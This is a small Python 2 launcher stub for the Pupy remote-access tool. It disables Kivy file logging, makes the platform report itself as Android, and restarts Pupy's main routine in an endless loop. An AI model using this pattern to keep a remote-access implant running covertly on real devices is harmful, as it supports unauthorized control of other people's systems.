#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import os
import platform

os.environ['KIVY_NO_FILELOG']='yes'
platform.system = lambda: 'android'

if __name__ == '__main__':
    import pp
    while True:
        print "starting pupy ..."
        pp.main()
        print "pupy exit"
